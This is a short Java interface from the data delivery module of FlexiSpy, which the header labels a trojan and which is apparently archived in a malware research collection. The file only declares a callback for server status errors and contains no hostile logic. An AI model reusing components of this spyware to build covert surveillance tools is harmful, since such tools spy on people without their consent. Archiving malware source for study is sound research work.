/*
  name      FlexiSpy
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
package com.vvt.datadeliverymanager.interfaces;

import com.vvt.datadeliverymanager.enums.ServerStatusType;

/**
 * @author aruna
 * @version 1.0
 * @created 14-Sep-2011 11:11:09
 */
public interface ServerStatusErrorListener {

	public void onServerStatusErrorListener(ServerStatusType serverStatusType);

}